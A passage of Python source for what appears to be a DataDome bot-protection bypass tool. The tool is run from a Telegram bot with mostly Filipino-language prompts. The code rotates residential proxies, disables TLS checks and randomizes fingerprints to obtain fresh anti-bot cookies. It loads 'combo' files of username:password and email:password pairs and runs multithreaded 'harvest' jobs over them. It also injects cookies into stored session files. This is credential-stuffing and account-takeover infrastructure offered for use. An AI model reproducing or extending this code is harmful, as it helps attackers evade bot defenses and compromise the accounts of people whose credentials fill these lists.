                self._hits += 1
                if updated:
                    self._updated += 1
            else:
                self._misses += 1

    def get(self):
        with self._lock:
            done = self._hits + self._misses
            return {
                "total": self._total,
                "done": done,
                "hits": self._hits,
                "updated": self._updated,
                "misses": self._misses,
            }


# ═══════════════════════════════════════════════════════════════
#  DATADOME FETCHER
# ═══════════════════════════════════════════════════════════════
class DataDomeFetcher:
    """Fetches fresh DataDome cookies via rotated proxies.
    
    Uses a FRESH session per request so residential proxies rotate
    their IP on every single fetch — no session reuse / IP stickiness.
    """

    def __init__(self, scanner: ProxyScanner, max_retries=3, timeout=5.0):
        self.scanner = scanner
        self.max_retries = max_retries
        self.timeout = timeout

    @staticmethod
    def _make_session(proxy_dict: dict) -> requests.Session:
        """Create a brand-new session for one request — ensures IP rotation on residential proxies."""
        session = requests.Session()
        session.proxies.update(proxy_dict)
        session.verify = False   # residential proxies often have self-signed tunnel certs
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=1,
            pool_maxsize=1,
            max_retries=0,
        )
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        return session

    def fetch(self, thread_id=None):
        """Fetch one fresh datadome. Returns dict: {success, datadome, proxy, error, latency_ms}

        thread_id — pass the worker thread index so each thread rotates its own
        proxy slot independently (no two threads share the same proxy at the same time).
        """
        proxy_dict, proxy_url = self.scanner.get_next(thread_id=thread_id)
        if proxy_dict is None:
            return {"success": False, "datadome": None, "proxy": "NONE", "error": "No proxies", "latency_ms": 0}

        for attempt in range(self.max_retries):
            # Fresh proxy every retry too — keep same thread slot
            if attempt > 0:
                proxy_dict, proxy_url = self.scanner.get_next(thread_id=thread_id)

            t0 = time.time()
            session = self._make_session(proxy_dict)
            try:
                headers, encoded_data = _random_fingerprint()
                resp = session.post(
                    _DD_URL, headers=headers, data=encoded_data,
                    timeout=(30, self.timeout),   # (connect_timeout, read_timeout) — residential proxies need longer connect time
                    verify=False,
                )
                latency = int((time.time() - t0) * 1000)
                resp.raise_for_status()
                body = resp.json()

                if body.get("status") == 200 and "cookie" in body:
                    dd = body["cookie"].split(";")[0].split("=", 1)[1]
                    return {"success": True, "datadome": dd, "proxy": self.scanner.current_display(), "error": None, "latency_ms": latency}

                # Non-200 DD status — try next proxy
                err = f"DD status: {body.get('status')} body: {str(body)[:120]}"
                logger.debug(f"[FETCH] {err} | proxy: {proxy_url}")
                continue

            except requests.exceptions.ProxyError as e:
                logger.debug(f"[FETCH] ProxyError on {proxy_url}: {e}")
                continue

            except requests.exceptions.Timeout:
                logger.debug(f"[FETCH] Timeout on {proxy_url}")
                continue

            except requests.exceptions.ConnectionError as e:
                logger.debug(f"[FETCH] ConnError on {proxy_url}: {e}")
                continue

            except Exception as e:
                logger.debug(f"[FETCH] Error on {proxy_url}: {e}")
                continue

            finally:
                try:
                    session.close()
                except Exception:
                    pass

        return {"success": False, "datadome": None, "proxy": self.scanner.current_display(), "error": "All retries failed", "latency_ms": 0}


# ═══════════════════════════════════════════════════════════════
#  TELEGRAM BOT
# ═══════════════════════════════════════════════════════════════
class TelegramBot:
    """Telegram bot for monitoring, proxy & combo management with inline keyboard menus."""

    API_BASE = "https://api.telegram.org/bot"

    # Auto-notify interval: only 1 background status message per N seconds
    AUTO_NOTIFY_INTERVAL = 300  # 5 minutes

    def __init__(self, token, chat_id, scanner, updater, fetcher, stats_ref,
                 combo_manager=None, combo_harvester=None, combo_stats=None,
                 dd_pool=None):
        self.token = token
        self.chat_id = chat_id
        self.scanner = scanner
        self.updater = updater
        self.fetcher = fetcher
        self.stats = stats_ref
        self.combo_manager = combo_manager
        self.combo_harvester = combo_harvester
        self.combo_stats = combo_stats
        self.dd_pool = dd_pool
        self._offset = 0
        self._lock = threading.Lock()
        self._allowed_chats = set()
        self._pending_file = {}   # {chat_id: ("proxy"|"combo", filename|"__upload__")}

        # ── Single-sender architecture ────────────────────────────────────────────
        # ONE background thread drains a queue. All send calls just enqueue a dict.
        # This makes concurrent sends physically impossible — the queue is FIFO and
        # only 1 thread reads from it.
        import queue as _queue
        self._outbox = _queue.Queue()
        self._sender_thread = threading.Thread(target=self._sender_worker, daemon=True)
        self._sender_thread.start()

        # Auto-notify gate: start timestamp = now, so first auto-notify fires after
        # the full AUTO_NOTIFY_INTERVAL — not immediately at boot.
        self._last_auto_notify = time.time()
        self._auto_notify_lock = threading.Lock()

        if chat_id:
            self._allowed_chats.add(str(chat_id))

    # ── Inline keyboard helpers ────────────────────────────────────
    def _main_menu(self):
        """Main inline keyboard menu — shown as sidebar-style grid on every message."""
        return {
            "inline_keyboard": [
                [
                    {"text": "📊 Status",        "callback_data": "cmd_status"},
                    {"text": "📈 Stats",          "callback_data": "cmd_stats"},
                ],
                [
                    {"text": "🍪 DataDome",      "callback_data": "cmd_datadome"},
                    {"text": "🍪 Cookie",         "callback_data": "cmd_cookie"},
                ],
                [
                    {"text": "🔄 Proxies",        "callback_data": "cmd_proxylist"},
                    {"text": "🔃 Rescan",          "callback_data": "cmd_rescan"},
                ],
                [
                    {"text": "🎯 Combos",          "callback_data": "cmd_combolist"},
                    {"text": "▶️ Harvest",         "callback_data": "cmd_harvest"},
                ],
                [
                    {"text": "⏹ Stop Harvest",    "callback_data": "cmd_harveststop"},
                    {"text": "📋 Combo Stats",     "callback_data": "cmd_combostats"},
                ],
                [
                    {"text": "📤 Upload Proxy",   "callback_data": "cmd_uploadproxy"},
                    {"text": "📤 Upload Combo",   "callback_data": "cmd_uploadcombo"},
                ],
                [
                    {"text": "📤 Upload Cookies", "callback_data": "cmd_uploadcookie"},
                    {"text": "💉 Set DataDome",   "callback_data": "cmd_setdatadome"},
                ],
            ]
        }

    def _sender_worker(self):
        """Single background thread that drains _outbox.
        This is the ONLY place that calls the Telegram sendMessage API.
        One thread = zero concurrent sends = zero spam, guaranteed.
        """
        import queue as _queue
        while True:
            try:
                payload = self._outbox.get(timeout=5)
            except _queue.Empty:
                continue
            try:
                requests.post(
                    f"{self.API_BASE}{self.token}/sendMessage",
                    json=payload, timeout=10
                )
            except Exception:
                pass
            time.sleep(1.0)   # Telegram allows max ~1 msg/sec per bot

    def _enqueue(self, text, chat_id=None, parse_mode="HTML", menu=True):
        """Build payload and put it in the outbox. Never blocks, never sends directly."""
        cid = chat_id or self.chat_id
        if not self.token or not cid:
            return
        payload = {"chat_id": cid, "text": text, "parse_mode": parse_mode}
        if menu:
            payload["reply_markup"] = self._main_menu()
        self._outbox.put(payload)

    def send(self, text, chat_id=None, parse_mode="HTML", menu=True):
        """Enqueue a message. Non-blocking — just adds to the outbox queue."""
        self._enqueue(text, chat_id, parse_mode, menu)

    def send_important(self, text, chat_id=None, parse_mode="HTML", menu=True):
        """Alias for send() — kept for compatibility. All sends go through the same queue."""
        self._enqueue(text, chat_id, parse_mode, menu)

    def auto_notify(self, text):
        """Background status update — enqueues at most once per AUTO_NOTIFY_INTERVAL.
        Safe to call from all 20 workers simultaneously; only 1 message ever gets queued.
        """
        now = time.time()
        # Fast path — no lock needed for the common case (interval not yet elapsed)
        if now - self._last_auto_notify < self.AUTO_NOTIFY_INTERVAL:
            return
        with self._auto_notify_lock:
            # Re-check inside lock — only 1 thread wins
            if now - self._last_auto_notify < self.AUTO_NOTIFY_INTERVAL:
                return
            self._last_auto_notify = now   # claim the slot before releasing lock
        self._enqueue(text)                # enqueue outside lock — non-blocking

    def answer_callback(self, callback_query_id, text=""):
        """Answer a callback query (clears the loading spinner)."""
        try:
            url = f"{self.API_BASE}{self.token}/answerCallbackQuery"
            requests.post(url, json={"callback_query_id": callback_query_id, "text": text}, timeout=5)
        except Exception:
            pass

    def edit_message(self, chat_id, message_id, text, parse_mode="HTML"):
        """Edit an existing message in-place with new text + refreshed menu."""
        try:
            url = f"{self.API_BASE}{self.token}/editMessageText"
            requests.post(url, json={
                "chat_id": chat_id, "message_id": message_id,
                "text": text, "parse_mode": parse_mode,
                "reply_markup": self._main_menu(),
            }, timeout=10)
        except Exception:
            pass

    def poll(self):
        """Poll for updates (long-polling)."""
        if not self.token:
            return
        try:
            url = f"{self.API_BASE}{self.token}/getUpdates"
            resp = requests.get(url, params={"offset": self._offset + 1, "timeout": 30}, timeout=35)
            resp.raise_for_status()
            data = resp.json()
            for update in data.get("result", []):
                self._offset = update["update_id"]
                # Handle both messages and button callbacks
                if "callback_query" in update:
                    self._handle_callback(update["callback_query"])
                else:
                    self._handle_update(update)
        except Exception as e:
            logger.debug(f"[TG] Poll error: {e}")

    def _handle_callback(self, cq):
        """Handle inline keyboard button presses."""
        chat_id    = str(cq["message"]["chat"]["id"])
        message_id = cq["message"]["message_id"]
        data       = cq.get("data", "")
        cq_id      = cq["id"]

        if self._allowed_chats and chat_id not in self._allowed_chats:
            self.answer_callback(cq_id)
            return

        self.answer_callback(cq_id)

        cmd_map = {
            "cmd_start":        self._do_start,
            "cmd_status":       self._do_status,
            "cmd_stats":        self._do_stats,
            "cmd_datadome":     self._do_datadome,
            "cmd_cookie":       self._do_cookie,
            "cmd_proxylist":    self._do_proxylist,
            "cmd_rescan":       self._do_rescan,
            "cmd_combolist":    self._do_combolist,
            "cmd_harvest":      self._do_harvest,
            "cmd_harveststop":  self._do_harveststop,
            "cmd_combostats":   self._do_combostats,
            "cmd_uploadproxy":  lambda cid, **kw: self._start_upload(cid, "proxy"),
            "cmd_uploadcombo":  lambda cid, **kw: self._start_upload(cid, "combo"),
            "cmd_uploadcookie": lambda cid, **kw: self._start_upload(cid, "cookie"),
            "cmd_setdatadome":  self._do_setdatadome_prompt,
        }
        handler = cmd_map.get(data)
        if handler:
            # For edit-in-place, pass message_id so we can update the same bubble
            try:
                handler(chat_id, message_id=message_id)
            except TypeError:
                handler(chat_id)

    def _handle_update(self, update):
        msg = update.get("message")
        if not msg:
            return
        chat_id = str(msg["chat"]["id"])
        text    = msg.get("text", "").strip()
        doc     = msg.get("document")

        # Auto-register first user as owner if no CHAT_ID set
        if not self.chat_id:
            self.chat_id = chat_id
            self._allowed_chats.add(chat_id)
            logger.info(f"[TG] Auto-registered owner: {chat_id}")

        if self._allowed_chats and chat_id not in self._allowed_chats:
            return

        # ── Document uploads ───────────────────────────────────────
        if doc:
            pending = self._pending_file.get(chat_id)
            if pending is not None:
                kind, _ = pending if isinstance(pending, tuple) else ("proxy", pending)
                self._pending_file.pop(chat_id, None)
                fname = doc.get("file_name", "uploaded.txt")
                if not fname.lower().endswith(".txt"):
                    self.send_important("❌ Only <code>.txt</code> files are accepted.", chat_id)
                    return
                file_id = doc.get("file_id")
                if kind == "combo":
                    self._handle_combo_file_upload(chat_id, file_id, fname)
                elif kind == "cookie":
                    self._handle_cookie_file_upload(chat_id, file_id, fname)
                else:
                    self._handle_proxy_file_upload(chat_id, file_id, fname)
            else:
                self.send_important(
                    "💡 Use /uploadproxy or /uploadcombo first, then send your .txt file.",
                    chat_id
                )
            return

        # ── Non-command messages (reply flow for /proxynew, setdatadome) ────────
        if not text.startswith("/"):
            pending = self._pending_file.pop(chat_id, None)
            if pending is not None:
                kind, fname = pending if isinstance(pending, tuple) else ("proxy", pending)

                # ── DataDome inject flow ───────────────────────────────
                if kind == "datadome_inject":
                    if not text.strip():
                        self.send_important("❌ Walang natanggap na value. Try ulit.", chat_id)
                        return
                    if self.dd_pool:
                        def _do_inject():
                            result = self.dd_pool.inject(
                                text.strip(),
                                fetcher=self.fetcher,
                                notify_fn=lambda msg: self.send_important(msg, chat_id)
                            )
                            injected = result.get("injected", [])
                            failed   = result.get("failed", [])
                            pool_size = self.dd_pool.size()

                            good_block = "\n".join(f"✅ <code>{v[:30]}...</code>" for v in injected) or "❌ None validated"
                            bad_block  = ("\n\n⚠️ <b>Failed:</b>\n" + "\n".join(f"❌ <code>{v[:30]}...</code>" for v in failed)) if failed else ""

                            self.send_important(
                                f"✅ <b>DataDome Inject Complete!</b>\n\n"
                                f"💉 <b>Injected ({len(injected)}):</b>\n{good_block}"
                                f"{bad_block}\n\n"
                                f"🏊 Pool: <b>{pool_size}</b> active value(s)\n"
                                f"🚀 All {NUM_WORKERS} workers back at full speed!",
                                chat_id
                            )
                        threading.Thread(target=_do_inject, daemon=True).start()
                    else:
                        # Fallback — no pool
                        raw = text.strip().split(",")[0].strip()
                        if raw.lower().startswith("datadome="):
                            raw = raw.split("=", 1)[1].strip()
                        r = self.updater.update_datadome(raw)
                        self.send_important(
                            f"✅ DataDome updated!\n<code>{raw[:40]}...</code>" if r.get("success")
                            else f"❌ Failed: {r.get('error','?')}",
                            chat_id
                        )
                    return

                lines = [l.strip() for l in text.splitlines() if l.strip()]
                if not lines:
                    self.send_important("❌ No entries found in message.", chat_id)
                elif kind == "combo":
                    self.combo_manager.create_file(fname, lines)
                    self.send_important(
                        f"✅ Created combo <b>{fname}</b> with {len(lines)} accounts\n"
                        f"Total accounts: {self.combo_manager.total}",
                        chat_id
                    )
                else:
                    self.scanner.create_file(fname, lines)
                    self.send_important(
                        f"✅ Created <b>{fname}</b> with {len(lines)} proxies\n"
                        f"Total proxies: {self.scanner.total}",
                        chat_id
                    )
            return

        cmd  = text.split()[0].lower()
        args = text.split()[1:]

        # Route commands
        if cmd == "/start":
            self._do_start(chat_id)
        elif cmd == "/status":
            self._do_status(chat_id)
        elif cmd == "/datadome":
            self._do_datadome(chat_id)
        elif cmd == "/cookie":
            self._do_cookie(chat_id)
        elif cmd == "/proxylist":
            self._do_proxylist(chat_id)
        elif cmd == "/rescan":
            self._do_rescan(chat_id)
        elif cmd == "/stats":
            self._do_stats(chat_id)
        elif cmd == "/combolist":
            self._do_combolist(chat_id)
        elif cmd == "/combostats":
            self._do_combostats(chat_id)
        elif cmd == "/harvest":
            self._do_harvest(chat_id)
        elif cmd == "/harveststop":
            self._do_harveststop(chat_id)
        elif cmd == "/uploadproxy":
            self._start_upload(chat_id, "proxy")
        elif cmd == "/uploadcombo":
            self._start_upload(chat_id, "combo")
        elif cmd == "/proxyadd":
            if len(args) < 2:
                self.send_important("Usage: /proxyadd [filename] [ip:port]\nExample: /proxyadd us.txt 1.2.3.4:8080", chat_id)
            else:
                fname = args[0] if args[0].endswith(".txt") else args[0] + ".txt"
                self.scanner.add_proxy_to_file(fname, args[1])
                self.send_important(f"✅ Added <code>{args[1]}</code> to {fname}\nTotal proxies: {self.scanner.total}", chat_id)
        elif cmd == "/proxynew":
            if not args:
                self.send_important("Usage: /proxynew [filename]\nThen send proxies in next message (one per line)", chat_id)
            else:
                fname = args[0] if args[0].endswith(".txt") else args[0] + ".txt"
                self._pending_file[chat_id] = ("proxy", fname)
                self.send_important(f"📄 Send proxies for <b>{fname}</b> (one ip:port per line):", chat_id)
        elif cmd == "/proxydel":
            if not args:
                self.send_important("Usage: /proxydel [filename]", chat_id)
            else:
                fname = args[0] if args[0].endswith(".txt") else args[0] + ".txt"
                self.scanner.delete_file(fname)
                self.send_important(f"🗑 Deleted {fname}\nTotal proxies: {self.scanner.total}", chat_id)
        elif cmd == "/combodel":
            if not args:
                self.send_important("Usage: /combodel [filename]", chat_id)
            else:
                fname = args[0] if args[0].endswith(".txt") else args[0] + ".txt"
                self.combo_manager.delete_file(fname)
                self.send_important(f"🗑 Deleted combo {fname}\nTotal accounts: {self.combo_manager.total}", chat_id)
        elif cmd == "/cookieset":
            if not args:
                self.send_important(
                    "Usage: /cookieset [cookie string]\n\n"
                    "Para sa maraming cookies (500 accounts), i-upload nalang ang .txt file gamit ang 📤 Upload Combo\n\n"
                    "O i-paste rito (one cookie per line):\n"
                    "<code>/cookieset datadome=xxx; sso_key=yyy; ...</code>",
                    chat_id
                )
            else:
                cookie_str = " ".join(args)
                self.updater.write_cookie(cookie_str)
                count = len(self.updater.read_all_cookies())
                self.send_important(f"✅ Cookie file updated — {count} line(s) saved.", chat_id)

        elif cmd == "/setdatadome":
            if not args:
                self.send_important(
                    "💉 <b>Set Fresh DataDome</b>\n\n"
                    "Usage: <code>/setdatadome value1, value2, value3</code>\n\n"
                    "• Isang value lang → i-validate at i-inject agad\n"
                    "• Maraming values (comma-separated) → i-validate lahat, i-add sa pool\n\n"
                    "Habang nag-inject, <b>1 thread lang</b> ang nagva-validate — "
                    "pagkatapos, bumabalik agad sa full speed!\n\n"
                    "Example:\n"
                    "<code>/setdatadome AHrlqAAAA...</code>\n\n"
                    "Multi:\n"
                    "<code>/setdatadome AHrlqAAAA..., BZxyAAAA..., CWuvAAAA...</code>",
                    chat_id
                )
            else:
                raw = " ".join(args)
                if self.dd_pool:
                    # Run inject in background thread so bot doesn't block
                    def _do_inject():
                        result = self.dd_pool.inject(
                            raw,
                            fetcher=self.fetcher,
                            notify_fn=lambda msg: self.send_important(msg, chat_id)
                        )
                        injected = result.get("injected", [])
                        failed   = result.get("failed", [])
                        pool_size = self.dd_pool.size()

                        if injected:
                            lines = [f"✅ <code>{v[:30]}...</code>" for v in injected]
                            good_block = "\n".join(lines)
                        else:
                            good_block = "❌ None validated"

                        bad_block = ""
                        if failed:
                            bad_lines = [f"❌ <code>{v[:30]}...</code>" for v in failed]
                            bad_block = "\n\n⚠️ <b>Failed validation:</b>\n" + "\n".join(bad_lines)

                        self.send_important(
                            f"✅ <b>DataDome Inject Complete!</b>\n\n"
                            f"💉 <b>Injected ({len(injected)}):</b>\n{good_block}"
                            f"{bad_block}\n\n"
                            f"🏊 Pool size: <b>{pool_size}</b> active DD value(s)\n"
                            f"🚀 All {NUM_WORKERS} workers resumed at full speed!",
                            chat_id
                        )
                    threading.Thread(target=_do_inject, daemon=True).start()
                else:
                    # Fallback: no pool — direct inject (old behaviour)
                    fresh_dd = args[0].strip()
                    if fresh_dd.lower().startswith("datadome="):
                        fresh_dd = fresh_dd.split("=", 1)[1].strip()
                    result = self.updater.update_datadome(fresh_dd)
                    if result.get("success"):
                        self.send_important(f"✅ DataDome updated!\n\n<code>{fresh_dd[:40]}...</code>", chat_id)
                    else:
                        self.send_important(f"❌ Failed: {result.get('error','?')}", chat_id)

    # ── Command handlers (shared by text commands & button callbacks) ──

    def _do_start(self, chat_id, **_):
        self.send_important(
            "🛡 <b>DataDome Bot</b>\n\n"
            "Use the buttons below to navigate, or type commands:\n\n"
            "<b>📡 Monitoring</b>\n"
            "/status /stats /datadome /cookie\n\n"
            "<b>🔄 Proxies</b>\n"
            "/proxylist /proxyadd /proxynew /proxydel /rescan /uploadproxy\n\n"
            "<b>🎯 Combo Harvest</b>\n"
            "/combolist /combodel /uploadcombo /harvest /harveststop /combostats\n\n"
            "<b>⚙️ Cookie</b>\n"
            "/cookieset /setdatadome",
            chat_id
        )

    def _do_status(self, chat_id, message_id=None, **_):
        stats   = self.stats.get_stats()
        dd      = self.updater.read_current_datadome()
        dd_short = (dd[:30] + "...") if dd and len(dd) > 30 else (dd or "NONE")
        uptime  = datetime.now() - datetime.fromisoformat(stats["started_at"])
        h, rem  = divmod(int(uptime.total_seconds()), 3600)
        m, s    = divmod(rem, 60)
        cs      = self.combo_stats.get() if self.combo_stats else {}
        harvest_status = "▶️ Running" if (self.combo_harvester and self.combo_harvester.is_running) else "⏹ Idle"
        text = (
            f"🛡 <b>DataDome Bot Status</b>\n\n"
            f"🔄 Proxies: {self.scanner.total}\n"
            f"🎯 Accounts: {self.combo_manager.total if self.combo_manager else 0}\n"
            f"🍪 Current DD: <code>{dd_short}</code>\n"
            f"✔ Fetched: {stats['fetched']}\n"
            f"↻ Updated: {stats['updated']}\n"
            f"✘ Failed: {stats['failed']}\n"
            f"⚡ Avg latency: {stats.get('avg_latency_ms', 0)}ms\n"
            f"🎯 Harvest: {harvest_status}\n"
            f"⏱ Uptime: {h:02d}:{m:02d}:{s:02d}"
        )
        if message_id:
            self.edit_message(chat_id, message_id, text)
        else:
            self.send_important(text, chat_id)

    def _do_stats(self, chat_id, message_id=None, **_):
        stats     = self.stats.get_stats()
        uptime    = datetime.now() - datetime.fromisoformat(stats["started_at"])
        h, rem    = divmod(int(uptime.total_seconds()), 3600)
        m, s      = divmod(rem, 60)
        file_stats = self.scanner.get_file_stats()
        files_info = "\n".join(f"  📄 {f}: {c}" for f, c in file_stats.items()) or "  (none)"
        text = (
            f"📊 <b>Detailed Stats</b>\n\n"
            f"✔ Fetched: {stats['fetched']}\n"
            f"↻ Updated: {stats['updated']}\n"
            f"✘ Failed: {stats['failed']}\n"
            f"⚡ Avg latency: {stats.get('avg_latency_ms', 0)}ms\n"
            f"🔄 Total proxies: {self.scanner.total}\n"
            f"📂 Proxy files:\n{files_info}\n"
            f"⏱ Uptime: {h:02d}:{m:02d}:{s:02d}"
        )
        if message_id:
            self.edit_message(chat_id, message_id, text)
        else:
            self.send_important(text, chat_id)

    def _do_datadome(self, chat_id, message_id=None, **_):
        dd = self.updater.read_current_datadome()
        text = f"🍪 <b>Current DataDome:</b>\n\n<code>{dd}</code>" if dd else "❌ No datadome in cookie file"
        if message_id:
            self.edit_message(chat_id, message_id, text)
        else:
            self.send_important(text, chat_id)

    def _do_cookie(self, chat_id, message_id=None, **_):
        content = self.updater.read_full_cookie()
        text = f"🍪 <b>Full Cookie:</b>\n\n<code>{content}</code>" if content else "❌ No cookie file found"
        if message_id:
            self.edit_message(chat_id, message_id, text)
        else:
            self.send_important(text, chat_id)

    def _do_setdatadome_prompt(self, chat_id, message_id=None, **_):
        """Button press — set pending state then ask user to paste value(s)."""
        self._pending_file[chat_id] = ("datadome_inject", None)
        text = (
            "💉 <b>I-paste ang DataDome value mo:</b>\n\n"
            "Puwede single o marami (comma-separated):\n\n"
            "<code>AHrlqAAAA...</code>\n\n"
            "o\n\n"
            "<code>AHrlqAAAA..., BZxyAAAA..., CWuvAAAA...</code>\n\n"
            "⏸ Mag-pa-pause ang workers habang nag-va-validate\n"
            "🚀 Babalik agad sa full speed pagkatapos!"
        )
        if message_id:
            self.edit_message(chat_id, message_id, text)
        else:
            self.send_important(text, chat_id)

    def _do_proxylist(self, chat_id, message_id=None, **_):
        files      = self.scanner.list_files()
        file_stats = self.scanner.get_file_stats()
        if not files:
            text = "📂 No proxy files found"
        else:
            rows = "\n".join(f"  📄 {f} — {file_stats.get(f, 0)} proxies" for f in files)
            text = f"📂 <b>Proxy Files:</b>\n\n{rows}\n\n🔄 Total: {self.scanner.total}"
        if message_id:
            self.edit_message(chat_id, message_id, text)
        else:
            self.send_important(text, chat_id)

    def _do_rescan(self, chat_id, message_id=None, **_):
        n    = self.scanner.rescan()
        text = f"🔃 Rescanned: <b>{n}</b> proxies from <b>{len(self.scanner.list_files())}</b> file(s)"
        if message_id:
            self.edit_message(chat_id, message_id, text)
        else:
            self.send_important(text, chat_id)

    def _do_combolist(self, chat_id, message_id=None, **_):
        if not self.combo_manager:
            text = "❌ Combo manager not available"
        else:
            files      = self.combo_manager.list_files()
            file_stats = self.combo_manager.get_file_stats()
            if not files:
                text = "🎯 No combo files found\n\nUpload one with /uploadcombo"
            else:
                rows = "\n".join(f"  📄 {f} — {file_stats.get(f, 0)} accounts" for f in files)
                text = f"🎯 <b>Combo Files:</b>\n\n{rows}\n\n👤 Total: {self.combo_manager.total}"
        if message_id:
            self.edit_message(chat_id, message_id, text)
        else:
            self.send_important(text, chat_id)

    def _do_harvest(self, chat_id, message_id=None, **_):
        if not self.combo_harvester or not self.combo_manager:
            text = "❌ Combo harvester not available"
        elif self.combo_harvester.is_running:
            text = "⚠️ Harvester is already running!\n\nUse ⏹ Stop Harvest to cancel."
        elif self.combo_manager.total == 0:
            text = "❌ No accounts loaded.\n\nUpload a combo file first with /uploadcombo or 📤 Upload Combo"
        else:
            started = self.combo_harvester.start()
            if started:
                text = (
                    f"▶️ <b>Combo Harvester Started!</b>\n\n"
                    f"👤 Accounts: {self.combo_manager.total}\n"
                    f"⚡ Threads: {COMBO_THREADS}\n"
                    f"🔄 Proxies: {self.scanner.total}\n\n"
                    f"Fresh datadomes will replace the old value in the cookie file.\n"
                    f"Check progress with 📋 Combo Stats"
                )
            else:
                text = "⚠️ Harvester is already running!"
        if message_id:
            self.edit_message(chat_id, message_id, text)
        else:
            self.send_important(text, chat_id)

    def _do_harveststop(self, chat_id, message_id=None, **_):
        if not self.combo_harvester:
            text = "❌ Combo harvester not available"
        elif not self.combo_harvester.is_running:
            text = "ℹ️ Harvester is not running"
        else:
            self.combo_harvester.stop()
            text = "⏹ <b>Harvester stopped.</b>"
        if message_id:
            self.edit_message(chat_id, message_id, text)
        else:
            self.send_important(text, chat_id)

    def _do_combostats(self, chat_id, message_id=None, **_):
        if not self.combo_stats:
            text = "❌ Combo stats not available"
        else:
            cs     = self.combo_stats.get()
            status = "▶️ Running" if (self.combo_harvester and self.combo_harvester.is_running) else "⏹ Idle"
            done   = cs.get("done", 0)
            total  = cs.get("total", 0)
            pct    = int(done / total * 100) if total else 0
            text = (
                f"📋 <b>Combo Harvest Stats</b>\n\n"
                f"Status: {status}\n"
                f"📊 Progress: {done}/{total} ({pct}%)\n"
                f"✅ Got cookie: {cs.get('hits', 0)}\n"
                f"↻ Cookie updated: {cs.get('updated', 0)}\n"
                f"❌ No cookie: {cs.get('misses', 0)}"
            )
        if message_id:
            self.edit_message(chat_id, message_id, text)
        else:
            self.send_important(text, chat_id)

    def _start_upload(self, chat_id, kind="proxy", **_):
        """Set pending upload state and prompt user."""
        self._pending_file[chat_id] = (kind, "__upload__")
        if kind == "cookie":
            self.send_important(
                "📤 <b>Upload Cookie File</b>\n\n"
                "I-send ang <code>.txt</code> file na may full cookies.\n"
                "One complete cookie string per line (lahat ng fields):\n\n"
                "<code>datadome=xxx; sso_key=yyy; PHPSESSID=zzz; ...</code>\n\n"
                "Puwede 1 line o hanggang 500+ lines — lahat ay awtomatikong\n"
                "maa-update ng fresh datadome every fetch cycle. ✅",
                chat_id
            )
        elif kind == "combo":
            self.send_important(
                "📤 <b>Upload Combo File</b>\n\n"
                "Send a <code>.txt</code> file with accounts.\n"
                "Formats accepted (one per line):\n"
                "• <code>username</code>\n"
                "• <code>username:password</code>\n"
                "• <code>email@example.com:password</code>",
                chat_id
            )
        else:
            self.send_important(
                "📤 <b>Upload Proxy File</b>\n\n"
                "Send a <code>.txt</code> file with proxies.\n"
                "Formats accepted (one per line):\n"
                "• <code>ip:port</code>\n"
                "• <code>ip:port:user:pass</code>\n"
                "• <code>http://user:pass@ip:port</code>",
                chat_id
            )

    # ── File upload handlers ────────────────────────────────────────

    # Max lines accepted per upload type
    _MAX_COOKIE_LINES = 500
    _MAX_PROXY_LINES  = 50_000
    _MAX_COMBO_LINES  = 100_000

    def _download_tg_file(self, file_id):
        """Download a Telegram file. Returns (content_text, filename) or (None, None).
        Supports files up to 20MB via streaming — does NOT load the whole file into RAM
        at once; reads in 64KB chunks.
        """
        url  = f"{self.API_BASE}{self.token}/getFile"
        resp = requests.get(url, params={"file_id": file_id}, timeout=15)
        resp.raise_for_status()
        file_path = resp.json().get("result", {}).get("file_path")
        if not file_path:
            return None, None
        dl = requests.get(
            f"https://api.telegram.org/file/bot{self.token}/{file_path}",
            timeout=60,
            stream=True,          # stream so we don't OOM on 20MB files
        )
        dl.raise_for_status()
        # Read in 64KB chunks — decode as utf-8 (latin-1 fallback for dirty files)
        chunks = []
        for chunk in dl.iter_content(chunk_size=65536):
            if chunk:
                try:
                    chunks.append(chunk.decode("utf-8"))
                except UnicodeDecodeError:
                    chunks.append(chunk.decode("latin-1", errors="replace"))
        return "".join(chunks), file_path.split("/")[-1]

    def _iter_valid_lines(self, content: str, skip_prefixes=("#",)):
        """Yield non-empty, non-comment lines from raw file content."""
        for line in content.splitlines():
            stripped = line.strip()
            if stripped and not any(stripped.startswith(p) for p in skip_prefixes):
                yield stripped

    def _handle_proxy_file_upload(self, chat_id, file_id, fname):
        try:
            content, _ = self._download_tg_file(file_id)
            if content is None:
                self.send_important("❌ Could not retrieve file from Telegram.", chat_id)
                return
            lines = list(self._iter_valid_lines(content))
            total_in_file = len(lines)
            if not lines:
                self.send_important(f"❌ File <b>{fname}</b> is empty or has no valid proxies.", chat_id)
                return
            # Cap at _MAX_PROXY_LINES
            trimmed = False
            if total_in_file > self._MAX_PROXY_LINES:
                lines = lines[:self._MAX_PROXY_LINES]
                trimmed = True
            self.scanner.create_file(fname, lines)
            logger.info(f"[TG] Proxy file uploaded: {fname} ({len(lines)}) from {chat_id}")
            note = f"\n⚠️ Trimmed to {self._MAX_PROXY_LINES:,} (file had {total_in_file:,})" if trimmed else ""
            self.send_important(
                f"✅ <b>{fname}</b> uploaded!\n"
                f"📋 Proxies loaded: <b>{len(lines):,}</b>{note}\n"
                f"🔄 Total proxies: <b>{self.scanner.total:,}</b>",
                chat_id
            )
        except Exception as e:
            logger.warning(f"[TG] Proxy upload error: {e}")
            self.send_important(f"❌ Error: {e}", chat_id)

    def _handle_combo_file_upload(self, chat_id, file_id, fname):
        try:
            content, _ = self._download_tg_file(file_id)
            if content is None:
                self.send_important("❌ Could not retrieve file from Telegram.", chat_id)
                return
            lines = list(self._iter_valid_lines(content, skip_prefixes=("#", "===")))
            total_in_file = len(lines)
            if not lines:
                self.send_important(f"❌ File <b>{fname}</b> is empty or has no valid accounts.", chat_id)
                return
            trimmed = False
            if total_in_file > self._MAX_COMBO_LINES:
                lines = lines[:self._MAX_COMBO_LINES]
                trimmed = True
            self.combo_manager.create_file(fname, lines)
            logger.info(f"[TG] Combo file uploaded: {fname} ({len(lines)}) from {chat_id}")
            note = f"\n⚠️ Trimmed to {self._MAX_COMBO_LINES:,} (file had {total_in_file:,})" if trimmed else ""
            self.send_important(
                f"✅ <b>{fname}</b> uploaded!\n"
                f"👤 Accounts loaded: <b>{len(lines):,}</b>{note}\n"
                f"🎯 Total accounts: <b>{self.combo_manager.total:,}</b>\n\n"
                f"Press ▶️ Harvest or /harvest to start harvesting.",
                chat_id
            )
        except Exception as e:
            logger.warning(f"[TG] Combo upload error: {e}")
